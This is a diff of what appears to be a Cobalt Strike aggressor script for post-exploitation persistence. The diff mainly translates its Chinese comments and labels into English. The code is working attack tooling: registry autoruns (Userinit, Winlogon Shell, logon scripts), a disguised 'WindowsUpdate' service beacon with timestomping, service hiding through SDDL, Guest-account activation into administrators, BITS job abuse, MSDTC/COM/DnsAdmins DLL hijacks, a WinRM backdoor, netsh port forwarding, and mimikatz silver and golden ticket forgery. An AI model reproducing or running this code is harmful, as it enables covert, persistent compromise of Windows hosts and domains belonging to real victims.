 					brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
 				}
 			}else if($3['RegItem'] eq "Winlogon Shell"){  
-				# 当用户登录后才会执行（可能需要注销-登录触发）,64位系统执行64位注册表位置；32位系统执行32位注册表位置；
-				# 根据系统位数启动
-				# 优先级高
-				# 用户权限 写入HKCU,触发成功。System权限写入HKCU会出现问题。注意！
+				# Execution only when User logged in (may need to logout-login Trigger ),64-bit system Execution64-bit Registration Form Location; 32-bit system Execution32-bit Registration Form location;
+				# Boot according to system bits
+				# High priority
+				# User permission Write to HKCU,Trigger succeeds. system permission Write to HKCU causes problems. Attention!
 				if($user eq "SYSTEM"){
 					blog($bid, "\c4 Your are $user ,There will be unexpected error.");
 					return;
@@ -1576,18 +1577,18 @@ menu "☆ 权限维持"{
 					brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
 				}		
 			}else if($3['RegItem'] eq "Logon Scripts"){
-				# SYSTEM(32位)权限下对该注册表项的查询、写入操作都被重定向到32位，加/reg:64也无效。 ,
-				# Administrator(32位)权限下对该注册表项的查询、写入操作都被重定向到64位，加/reg:32也无效。
-				# 可能需要用户注销再登录后触发。重启登录不稳定执行。
-				# 用户权限添加
-				# 登录执行
-				# 仅执行对应系统位数注册表位置,一般是x64
+				# SYSTEM (32-bit) privileges for this Registration Form item Query, Write to Operation are redirected to 32-bit, adding /reg:64 is also invalid. ,
+				# Query and Write to Operation for this Registration Form item under Administrator (32-bit) privileges are redirected to 64-bit, and adding /reg:32 does not work.
+				# May require User to log out and log in again after Trigger. Restarting login does not stabilize Execution.
+				# User Permissions Add 
+				# Login Execution
+				# Only Execution corresponds to the system bit Registration Form location, usually x64
 				
 				$Key = "\"HKCU";
 				blog($bid, "Location:HKEY_CURRENT_USER\\Environment, KeyName:UserInitMprLogonScript");
 				
 				if($user eq "SYSTEM"){
-					# 对于HKCU表，不要使用SYSTEM权限。
+					# For the HKCU table, do not use the SYSTEM permission.
 					blog($bid, "\c4 Your are $user ,There will be unexpected error.");
 					return;
 				}
@@ -1615,7 +1616,7 @@ menu "☆ 权限维持"{
 			}
 		}
 
-		#查询注册表
+		#QueryRegistration Form
 		sub QueryRegAutoRun{
 			local('$Prefix $Key $Item $Reg $bid');
 			$Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
@@ -1663,7 +1664,7 @@ menu "☆ 权限维持"{
 			}
 		}
 
-		#清理注册表
+		#Clear Registration Form
 		sub RemoveRegAutoRun{
 			local('$Prefix $File $Key $Item $Reg $bid $KeyName $arch');
 			$Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
@@ -1734,9 +1735,9 @@ menu "☆ 权限维持"{
 			}
 		}
 		# Service
-		#添加服务  @("自启动","延时启动","手动启动","触发器启动", "启动失败回调"));
+		#Add Service  @("Self-start", "Delayed-start", "Manual-start", "Trigger-start", "Start failure callback"));
 		sub InstallAutoService{
-			# 如果服务不是标准的服务程序，binpath使用 cmd /c start xx 或 rundll32.exe xx.dll 执行 sc config Wdfup depend= AppVClient, depend参数可以将手动启动的服务拉起，可以修改其他系统服务指向恶意服务（depend 指定必须在此服务之前启动的服务或组的名称。 名称由正斜杠分隔 (/)） 
+			# If the service is not standard Service Procedure，binpathUse cmd /c start xx or rundll32.exe xx.dll Execution sc config Wdfup depend= AppVClient, dependParameters to pull up the manually started service, which can modify other System Services to point to the malicious service ( depend specifies the Name of the service or group that must be started before this service. The Name name is separated by a forward slash (/)
 			local('$Name $File $Displayname $Description $bid $Type $addtype $setsddl $sddl $sddla $serviceFile $evilFile');
 			$Type = $3['stype'];
 			$Name = $3['servicename'];
@@ -1752,11 +1753,11 @@ menu "☆ 权限维持"{
 			blog($bid, "-------".getnow()."-------");
 			
 			blog($bid,"cmdline:$cmdline");
-			#SDDL设置
-			if($setsddl eq "隐藏服务" ){
+			#SDDLSettings 
+			if($setsddl eq "Hide Services" ){
 				$sddla = "hidden";
 				$sddl = "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
-			}else if($setsddl eq "只读服务"){
+			}else if($setsddl eq "Read Only Service"){
 				$sddla = "read";
 				$sddl = "D:(D;;DCWPDTSD;;;IU)(D;;DCWPDTSD;;;SU)(D;;DCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
 			}else{
@@ -1772,7 +1773,7 @@ menu "☆ 权限维持"{
 			bupload_raw($bid, $File, readb(openf($evilFile), -1));
 			btimestomp($bid, $File, "C:\\windows\\regedit.exe");
 			if($addtype eq "sc cmdline"){
-				if($Type eq "自启动"){
+				if($Type eq "Self-Start"){
 					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
 					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 					blog($bid,"net start \" $+ $Displayname\"")
@@ -1781,7 +1782,7 @@ menu "☆ 权限维持"{
 					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
 					bshell($bid, "net start \" $+ $Displayname\"");	
 				}
-				else if($Type eq "触发器启动"){
+				else if($Type eq "Trigger Machine start"){
 					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $$cmdline\" start= demand obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
 					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 					blog(($bid,"sc triggerinfo \" $+ $Name\" start/networkon"))
@@ -1792,16 +1793,16 @@ menu "☆ 权限维持"{
 					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
 					bshell($bid, "net start \" $+ $Displayname\"");
 				}
-				else if($Type eq "启动失败回调"){
-					#失败回调方法 sc create Wdfup binpath= "C:\Windows\System32\uinit.exe"
+				else if($Type eq "Start-up failure callback"){
+					#Failure to retrace Method sc create Wdfup binpath= "C:\Windows\System32\uinit.exe"
 					#sc failure Wdfup reset=5000 actions=run/500 command="C:\Users\Administrator\Desktop\Powershell\beacon.exe"
 					
-					# 1. 上传服务程序到system32,
+					# 1. Upload Service Procedure to system32,
 					blog($bid,"Upload ".script_resource("scripts/AuthMaintainExitservice/uinit.exe")." to ".$serviceFile);
 					bupload_raw($bid, $serviceFile, readb(openf(script_resource("scripts/AuthMaintainExitservice/uinit.exe")), -1));
 					btimestomp($bid, $serviceFile, "C:\\windows\\regedit.exe");
 					
-					# 2.  创建服务
+					# 2.  Create Service
 					blog($bid,"sc create \" $+ $Name\" binpath= \"C:\\windows\\system32\\uinit.exe\" start= auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
 					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 					blog($bid,"sc failure \" $+ $Name\" reset=5000 actions=run/500 command=\" $+ $cmdline\"")
@@ -1813,7 +1814,7 @@ menu "☆ 权限维持"{
 					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
 					bshell($bid, "net start \" $+ $Displayname\"");
 				}
-				else if ($Type eq "延时启动"){
+				else if ($Type eq "Delayed start"){
 					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= delayed-auto obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
 					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 					blog($bid,"net start \" $+ $Displayname\"")
@@ -1822,7 +1823,7 @@ menu "☆ 权限维持"{
 					bshell($bid,"sc sdset \" $+ $Name\" \"$sddl\"");
 					bshell($bid, "net start \" $+ $Displayname\"");	
 				}
-				else if ($Type eq "手动启动"){
+				else if ($Type eq "Manual start"){
 					blog($bid,"sc create \" $+ $Name\" binpath= \" $+ $cmdline\" start= demand obj= LocalSystem displayname= \" $+ $Displayname\" error= ignore")
 					blog($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 					blog($bid,"net start \" $+ $Displayname\"")
@@ -1837,20 +1838,20 @@ menu "☆ 权限维持"{
 					berror($bid,"ServiceFile not found.");
 					return;
 				}
-				if($Type eq "自启动"){
+				if($Type eq "Self-Start"){
 					$Type  = "SERVICE_AUTO_START";
-				}else if($Type eq "触发器启动"){
+				}else if($Type eq "Trigger Machine start"){
 					$Type  = "SERVICE_HD_START";
-				}else if($Type eq "启动失败回调" ){
+				}else if($Type eq "Start-up failure callback" ){
 					if($serviceFile eq ""){
 						berror($bid,"Not found ServiceFile,Please chonfirm your input.");
 						return;
 					}
 					$Type  = "SERVICE_Callback_START";
 					
-				}else if($Type eq "手动启动" ){
+				}else if($Type eq "Manual start" ){
 					$Type  = "SERVICE_DEMAND_START";
-				}else if ($Type eq "延时启动"){
+				}else if ($Type eq "Delayed start"){
 					$Type  = "SERVICE_CONFIG_DELAYED_AUTO_START_INFO";
 				}
 
@@ -1865,13 +1866,13 @@ menu "☆ 权限维持"{
 						blog($bid,"Upload ".script_resource("scripts/AuthMaintainExitservice/uinit.exe")." to $serviceFile");			
 						$handle = openf(script_resource("scripts/AuthMaintainExitservice/uinit.exe"));
 						$bdata   = readb($handle, -1);
-						closef($handle);#关闭句柄，不关的话文件会被锁定
+						closef($handle);#Close the handle, the file will be locked if you don't close it
 						bupload_raw($bid, $serviceFile, $bdata );
 					}else{
 						blog($bid,"Upload ".script_resource("scripts/AuthMaintainServices/TransitEXE.exe")." to $serviceFile");	
 						$handle = openf(script_resource("scripts/AuthMaintainServices/TransitEXE.exe"));
 						$bdata   = readb($handle, -1);
-						closef($handle);#关闭句柄，不关的话文件会被锁定
+						closef($handle);#Close the handle, the file will be locked if you don't close it
 						bupload_raw($bid, $serviceFile,$bdata);
 					}
 					$Data = replace(URLencode($Name),'\+','%20')."|".replace(URLencode($Displayname),'\+','%20')."|".$serviceFile."|".$File."|".$cmdline."|".replace(URLencode($Description),'\+','%20') ."|".$Type."|".$sddla."|"."start";
@@ -1880,7 +1881,7 @@ menu "☆ 权限维持"{
 				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Services/reflective_dll.dll"),$Data, "Use API add Service", 5000);	
 			}
 		}
-		#修改服务,使用config , description 选项
+		#Modify Service,Use the config , description options
 		sub ChangeAutoService{
 			local('$Name $File $Displayname $Description $bid');
 			$Name = $3['servicename'];
@@ -1896,14 +1897,14 @@ menu "☆ 权限维持"{
 			bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 			bshell($bid, "net start \" $+ $Name\"");		
 		}
-		#隐藏服务,sc sdset设置服务安全描述符定义语言(SDDL)
+		#Hide Service,sc sdsetSettings ServiceSecurity Descriptor Definition Language(SDDL)
 		sub HiddenService{
 			local('$Name $SDL $bid');
 			$Name = $3['servicename'];
 			$SDL = $3['SDDL'];
 			$bid =  $3['bid'];
 			blog($bid, "-------".getnow()."-------");
-			if($SDL eq "隐藏"){
+			if($SDL eq "Hide"){
 				blog($bid,"sc sdset \" $+ $Name\" \"D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"")
 				bshell($bid,"sc sdset \" $+ $Name\" \"D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"")	
 			}else{
@@ -1921,7 +1922,7 @@ menu "☆ 权限维持"{
 			bshell($bid,"sc delete \" $+ $Name\"");
 		}
 
-		#查询服务
+		#Query Service
 		sub QService{
 			local('$Name $Typ $Stat $Qtyp $bid');
 			$Name = $3['servicename'];
@@ -1957,24 +1958,23 @@ menu "☆ 权限维持"{
 			$tmp = replace($tmp,'|','');
 			
 			$Type = $3['addtype'];   #API NET 
-			$Do = $3['DoFt'];        #禁用 、启用、删除组用户
-			#启用
+			$Do = $3['DoFt'];        #Disable, Enable, Delete group User 
+			#Enable
 			if($Do eq "enable"){
-				#net 命令启用
+				#net Command Enable
 				if($Type eq "NET"){
 					blog($bid, "Enable user $User : $User/$Pwd");
 					bshell($bid, "net user $User /active:yes");
 					bshell($bid, "net localgroup $groups $User /add");
 					bshell($bid, "net user $User $Pwd");
 				}else if($Type eq "API"){
-					# API 启用
-					# Guest,1,administrators,password  启用Guest,加入管理组,设置密码
-					
+					# API Enable
+					# Guest,1,administrators,password  Enable Guest,Join Management Group,Settings Password
 					blog($bid, "Use API to Enable account $User");
 					if($comment eq ""){
 						$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
 					}else{
-						$comment = URLencode($tmp); #账户描述 
+						$comment = URLencode($tmp); #Account Description 
 						$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".$comment;
 					}
 
@@ -1983,7 +1983,7 @@ menu "☆ 权限维持"{
 				}else{
 					blog($bid, "0");
 				}
-			}else if($Do eq "disabled"){  #禁用
+			}else if($Do eq "disabled"){  #Disable
 				if($Type eq "NET"){
 					blog($bid, "Disabled user $User");
 					blog($bid, "net localgroup $groups $User /del");
@@ -1992,7 +1992,7 @@ menu "☆ 权限维持"{
 					bshell($bid, "net user $User /active:no");
 				}else if($Type eq "API"){
 					blog($bid, "Use API to disable account $User");
-					# Guest,0,administrators,password  禁用Guest,移除所属组,设置密码(不会执行)
+					# Guest,0,administrators,password  Disable Guest, Remove Group, Settings Password (will not Execute)
 					
 					$Parameter = "DisableUser"."|".$User."|1|".$groups."|1";
 					blog($bid, "$Parameter");
@@ -2001,13 +2001,13 @@ menu "☆ 权限维持"{
 					
 				}
 			}else{  
-				#从某组中移除用户
+				#Remove a User from a group 
 				if($Type eq "NET"){
 					blog($bid, "net localgroup $groups $User /del");
 					bshell($bid, "net localgroup $groups $User /del");
 				}else if($Type eq "API"){
 					blog($bid, "Use API to Remove user $User in Groups $groups");
-					# Guest,3,administrators,password  移除用户所属组(因为如果guest在管理组里,下次激活会失败),设置密码(不会执行)
+					# Guest,3,administrators,password  Remove the User group (because if the guest is in the admin group, the next activation will fail), Settings password (will not Execution)
 				
 					$Parameter = "DelUserFromGroup"."|".$User."|".$Pwd."|".$groups."|1";
 					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUserFromGroup", 5000);	
@@ -2017,7 +2017,7 @@ menu "☆ 权限维持"{
 			}
 		}
 
-		sub AdUser{
+		sub AddUser{
 			local('$User $Pwd $groups $bid $Type $Parameter $comment $tmp $length1 $length2 $cmd1 $cmd2');
 			$bid = $3['bid'];
 			$User = $3['user'];
@@ -2110,7 +2110,7 @@ menu "☆ 权限维持"{
 			$filenameRand = [new StringBuffer];
 			for ($x = 0; $x < $int; $x++)
 				{
-					$number = [$random nextInt:int(strlen($str))]; #随机数
+					$number = [$random nextInt:int(strlen($str))]; #Random Number
 					# println($number);
 					$char = charAt($str, $number);
 					[$filenameRand append: $char ];
@@ -2127,7 +2127,7 @@ menu "☆ 权限维持"{
 			brun($bid, "bitsadmin /rawreturn /create $JobName");
 			brun($bid, "bitsadmin /rawreturn /addfile $JobName C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif");
 			brun($bid, "bitsadmin /rawreturn /setnotifycmdline $JobName $CmdLine");
-			brun($bid, "bitsadmin /rawreturn /setpriority $JobName high"); # 设置指定作业的优先级。 FOREGROUND HIGH NORMAL LOW
+			brun($bid, "bitsadmin /rawreturn /setpriority $JobName high"); # Settings Specify the priority of the job. FOREGROUND HIGH NORMAL LOW
 			brun($bid, "bitsadmin /rawreturn /resume $JobName");
 		}
 
@@ -2139,16 +2139,16 @@ menu "☆ 权限维持"{
 			$ociFile = $3['ociFile'];
 			$UploadPath = $3['UploadPath'];
 			$Arch = $3['Arch'];
-			if($type eq "上传本地文件" ){
+			if($type eq "Upload local file" ){
 				if($ociFile eq ""){
-					$Dialog = dialog("上传oci.dll", %(UploadPath => $UploadPath , bid => $bid, Arch => $Arch ,Type => "上传本地文件",ociFile => $ociFile), &msdtcdll);
-					dialog_description($Dialog, "请选择oci.dll上传");
+					$Dialog = dialog("Upload oci.dll", %(UploadPath => $UploadPath , bid => $bid, Arch => $Arch ,Type => "Upload local file",ociFile => $ociFile), &msdtcdll);
+					dialog_description($Dialog, "Please select oci.dllUpload ");
 					drow_file($Dialog, "ociFile", "File: ");
-					dbutton_action($Dialog, "上传");
+					dbutton_action($Dialog, "Upload ");
 					dialog_show($Dialog);
 				}
 				else{
-					#文件上传
+					#File Upload 
 					blog($bid,"Upload ".$ociFile." to C:\\windows\\system32\\oci.dll");	
 					$handle = openf($ociFile);
 					$bdata   = readb($handle, -1);
@@ -2166,7 +2166,7 @@ menu "☆ 权限维持"{
 						blog($bid,"sc config msdtc start= auto obj= LocalSystem");
 						brun($bid,"sc stop msdtc");
 						brun($bid,"sc config msdtc start= auto obj= LocalSystem");
-						$Data = pack("I-", 1) . "MSDTC"; # 为1的时候就是启动，0就为卸载
+						$Data = pack("I-", 1) . "MSDTC"; # When it is 1, it is start, when it is 0, it is uninstall
 						bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/MoveFileEx.dll"),$Data, "Move Wow64 File To system32", 5000);
 						blog($bid,"sc start msdtc");
 						brun($bid,"sc start msdtc");	
@@ -2182,55 +2182,55 @@ menu "☆ 权限维持"{
 	}
 
 	separator();
-    item "CS 服务马" {
-		blog($1, "\c9=========== CS 服务马 ==========");
+    item "CS Service Horse" {
+		blog($1, "\c9=========== CS Service Horse ==========");
         $bid = $1;
         servicebeacon($bid);
     }
 
-    item "Winrm 后门" {
-		blog($1, "\c9=========== Winrm 后门 ==========");
+    item "Winrm Backdoor" {
+		blog($1, "\c9=========== Winrm Backdoor ==========");
         $bid = $1;
         winrm_config($bid);
     }
 
-    item "Msdtc DLL 劫持" {
-		blog($1, "\c9=========== Msdtc DLL 劫持 ==========");
+    item "Msdtc DLL Hijack" {
+		blog($1, "\c9=========== Msdtc DLL Hijack ==========");
         $bid = $1;
         msdtc($bid);
 
     }
     
-    item "Dnsadmin 后门" {
-		blog($1, "\c9=========== Dnsadmin 后门 ==========");
+    item "Dnsadmin Backdoor" {
+		blog($1, "\c9=========== Dnsadmin Backdoor ==========");
         $bid = $1;
         dnsadmin_config($bid);
     }
 
 
-    item "WmiPrvSE 劫持" {
-		blog($1, "\c9=========== WmiPrvSE 劫持 ==========");
-        show_message("WmiPrvSE提权机会只有一次，失败就没了。一般系统运行只有一个WmiPrvSE.exe进程，当有超过一个WmiPrvSE.exe进程存在时。无法提权");
+    item "WmiPrvSE Hijack" {
+		blog($1, "\c9=========== WmiPrvSE Hijack ==========");
+        show_message("WmiPrvSEThe opportunity to withdraw power is only once, failure is gone. General system Run only one WmiPrvSE.exe process, when there is more than one WmiPrvSE.exe process exists. Can not raise the right");
         WmiPrvSE_config($bid);
     }
     
-    item "CacheTask COM 劫持" {
-		blog($1, "\c9=========== CacheTask任务计划COM接口劫持 ==========");
+    item "CacheTask COM Hijack" {
+		blog($1, "\c9=========== CacheTask Task Plan COM interface Hijack ==========");
         CacheTask($bid);
     }
     
-	  item "白银票据" {
-		blog($1, "\c9=========== 白银票据 ==========");
+	  item "Silver Ticket" {
+		blog($1, "\c9=========== Silver Ticket ==========");
     $bid = $1['@'];
-		$dialog = dialog("白银票据", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
-    dialog_description($dialog, "生成白银票据，攻击者必须获得目标服务账号的密码ntml-hash值。");
-    drow_text($dialog, "domain", "域名: ");
+		$dialog = dialog("Silver Ticket", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
+    dialog_description($dialog, "To generate the Silver Ticket, the attacker must obtain the password ntml-hash value of the target service account.");
+    drow_text($dialog, "domain", "Domain Name: ");
     drow_text($dialog, "sid", "sid: ");
-    drow_text($dialog, "target", "目标主机名: ");
+    drow_text($dialog, "target", "Target Host Name: ");
     drow_text($dialog, "rc4", "NTLM-hash: ");
-    drow_text($dialog, "service", "伪造的服务: ");
-    drow_text($dialog, "user", "伪造用户名: ");
-    dbutton_action($dialog, "运行");
+    drow_text($dialog, "service", "Fake service: ");
+    drow_text($dialog, "user", "Fake User Name: ");
+    dbutton_action($dialog, "Run");
     dialog_show($dialog);
   }
   sub SilverTicket {
@@ -2243,16 +2243,16 @@ menu "☆ 权限维持"{
     bmimikatz($bid, "kerberos::golden /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /user:$user /ptt exit");
   }
 
-  item "黄金票据" {
-		blog($1, "\c9=========== 黄金票据 ==========");
+  item "Golden ticket" {
+		blog($1, "\c9=========== Golden ticket ==========");
     $bid = $1['@'];
-		$dialog = dialog("黄金票据", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket);
-    dialog_description($dialog, "生成黄金票据，攻击者必须获得krbtgt账户的ntml-hash值。");
-    drow_text($dialog, "admin", "伪造用户名: ");
-    drow_text($dialog, "domain", "域名: ");
+		$dialog = dialog("Golden ticket", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket);
+    dialog_description($dialog, "To generate a Golden ticket, the attacker must obtain the ntml-hash value of the krbtgt account.");
+    drow_text($dialog, "admin", "Fake User Name: ");
+    drow_text($dialog, "domain", "Domain Name: ");
     drow_text($dialog, "sid", "sid: ");
     drow_text($dialog, "krbtgt", "krbtgt NTLM-hash: ");
-    dbutton_action($dialog, "运行");
+    dbutton_action($dialog, "Run");
     dialog_show($dialog);
   }
   sub GoldenTicket {
@@ -2273,10 +2273,10 @@ sub servicerun{
 	$handle = openf(">$exename");
 	writeb($handle, $data);
 	closef($handle);
-	btask($3["bid"], "生成服务马，Listener:$3['listener'] 位数:$3['arch'] 保存名称:$exename");
+	btask($3["bid"], "Generate service horse, Listener:$3['listener'] bits:$3['arch'] saveName name:$exename");
 	bupload($3["bid"], script_resource($exename));
 	bmv($3['bid'], $exename, $3["uploadoutpath"].$exename);
-	btask($3["bid"], "上传到$3['uploadoutpath']");
+	btask($3["bid"], "Upload to $3['uploadoutpath']");
 	$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$exename." start= auto obj= LocalSystem DisplayName= windowsupdate";
 	btask($3["bid"], "run $command");
 	bshell($3["bid"],  $command);
@@ -2295,7 +2295,7 @@ sub winrm_set{
 		bshell($bid, "winrm set winrm/config/Client @{TrustedHosts=\"*\"}");
 		btask($bid, "winrm config");
 		bshell($bid, "winrm e winrm/config/listener");
-	#	btask($bid,"客户端连接使用：winrm quickconfig -q\nwinrm set winrm/config/Client @{TrustedHosts="*"}\nwinrs -r:<ip>:<port> -u:<user> -p:<password> <command>\nExample:winrs -r:http://127.0.0.1:80 -u:administrator -p:123456 whoami");
+	#	btask($bid,"Client connection using：winrm quickconfig -q\nwinrm set winrm/config/Client @{TrustedHosts="*"}\nwinrs -r:<ip>:<port> -u:<user> -p:<password> <command>\nExample:winrs -r:http://127.0.0.1:80 -u:administrator -p:123456 whoami");
 	}else{
 		berror($3['bid'], "Not an administrator");
 	}
@@ -2303,7 +2303,7 @@ sub winrm_set{
 
 sub winrm_config{
 	$dialog = dialog("Winrm config", %(port => "80", bid => $bid), &winrm_set);
-	dialog_description($dialog, "winrm后门端口设置\nwindows server 2008或以下端口默认为80端口(端口复用)，无法进行修改");
+	dialog_description($dialog, "winrmBackdoor Port Settings \nwindows server 2008 or the following ports default to port 80 (port multiplexing), can not be modified");
 	drow_text($dialog, "port", "port:");
 	dbutton_action($dialog, "run");
 	dialog_show($dialog);
@@ -2315,7 +2315,7 @@ sub usbhistory{
 }
 
 sub checkdomain{
-	bpowerpick($bid, "\$domain=(((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq \$False ) -or ( -not  \$Env:USERDNSDOMAIN);write-Host \"是否有域(True/False):\"\$domain");
+	bpowerpick($bid, "\$domain=(((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq \$False ) -or ( -not  \$Env:USERDNSDOMAIN);write-Host \"Is there a domain(True/False):\"\$domain");
 }
 
 sub deviceget{
@@ -2358,7 +2358,7 @@ sub msdtc_config{
 	$dllname_w = $3['file2']."\\\\oci.dll";
 	foreach $id ($bid){
 		if(-isadmin $id){
-			btask($id, "配置msdtc dll劫持");
+			btask($id, "Configuration msdtc dllHijack");
 			bshell($id, "sc stop msdtc");
 			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
 			bupload($id, $dll);
@@ -2366,14 +2366,14 @@ sub msdtc_config{
 			bshell($id, "sc config msdtc obj= LocalSystem");
 			bshell($id, "sc start msdtc");
 		}else{
-			btask($id, "不是Administrator权限");
+			btask($id, "No Administrator privileges");
 		}
 	}
 }
 
 sub msdtc{
 	$dialog = dialog("msdtc DLL hijack config", %(file => "",file2 => "C:\\Windows\\System32"), &msdtc_config);
-	dialog_description($dialog, "msdtc DLL劫持");
+	dialog_description($dialog, "msdtc DLLHijack");
 	drow_file($dialog, "file", "DLL Path:");
 	drow_text($dialog, "file2", "RHOST Path:");
 	dbutton_action($dialog, "RUN");
@@ -2395,7 +2395,7 @@ sub dnsadminrun{
 sub dnsadmin_config{
 	foreach $id ($bid){
 		$dialog = dialog("DnsAdminConfig", %(uploadpath => "C:\\Windows\\System32\\", bid => $id), &dnsadminrun);
-		dialog_description($dialog, "DnsAdmins权限维持");
+		dialog_description($dialog, "DnsAdmins Persistence");
 		drow_text($dialog, "uploadpath", "uploadpath:");
 		drow_file($dialog, "dllpath", "dllpath:" );
 		dbutton_action($dialog, "run");
@@ -2404,7 +2404,7 @@ sub dnsadmin_config{
 }
 
 sub CacheTaskExec{
-	btask($3['bid'], "CacheTask任务计划COM接口DLL劫持");
+	btask($3['bid'], "CacheTask Task Plan COM interface DLLHijack");
 	$dllname = split("\\\\", $3['dllpath'])[-1];
 	bupload!($3['bid'], $3['dllpath']);
 	bmv!($3['bid'], $dllname, $3['uploadpath']);
@@ -2415,7 +2415,7 @@ sub CacheTaskExec{
 sub CacheTask{
 	foreach $id ($bid){
 		$dialog = dialog("CacheTask", %(uploadpath => "C:\\Windows\\Temp\\test.dll", bid => $id), &CacheTaskExec);
-		dialog_description($dialog, "CacheTask任务计划COM接口DLL劫持,适用系统:Windows 10/Windows Server 2012或以上");
+		dialog_description($dialog, "CacheTask Task plan COM interface DLLHijack, for systems: Windows 10/Windows Server 2012 or above");
 		drow_text($dialog, "uploadpath", "uploadpath:");
 		drow_file($dialog, "dllpath", "dllpath:");
 		dbutton_action($dialog, "run");
@@ -2423,11 +2423,10 @@ sub CacheTask{
 	}
 }
 
-
 sub servicebeacon{
 	foreach $id ($bid){
 		$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", arch => barch($id) ,exename => "svchost.exe", servicename => "WindowsUpdate", bid => $id), &servicerun);
-		dialog_description($dialog, "生成服务马上传执行，进行权限维持");
+		dialog_description($dialog, "Generate service horse Upload Execution for permission maintenance");
 		drow_text($dialog, "arch", "arch:");
 		drow_text($dialog, "uploadoutpath", "uploadoutpath:");
 		drow_text($dialog, "servicename",  "servicename:");
@@ -2439,7 +2438,6 @@ sub servicebeacon{
 
 }
 
-
 sub netsh_exec{
 	if ($set eq "port"){
 		$lhost = $3['lhost'];
@@ -2447,9 +2445,9 @@ sub netsh_exec{
 		$lport = $3['lport'];
 		$rport = $3['rport'];
 		foreach $id ($bid){
-			btask($id, "端口转发:$lhost : $lport -> $rhost : $rport");
+			btask($id, "Port Forwarding:$lhost : $lport -> $rhost : $rport");
 			bshell($id, "netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost");
-			btask($id, "查看端口转发列表");
+			btask($id, "View Port Forwarding List");
 			bshell($id, "netsh interface portproxy show all");
 
 		}
@@ -2457,9 +2455,9 @@ sub netsh_exec{
 		$lhost = $3['lhost'];
 		$lport = $3['lport'];
 		foreach $id ($bid){
-			btask($id, "删除端口转发：$lhost : $lport");
+			btask($id, "Delete Port Forwarding：$lhost : $lport");
 			bshell($id, "netsh interface portproxy delete v4tov4 listenport=$lport listenaddress=$lhost");
-			btask($id, "查看端口转发列表");
+			btask($id, "View Port Forwarding List");
 			bshell($id, "netsh interface portproxy show all");
 		}
 	}
@@ -2467,7 +2465,7 @@ sub netsh_exec{
 
 sub netsh_poort{
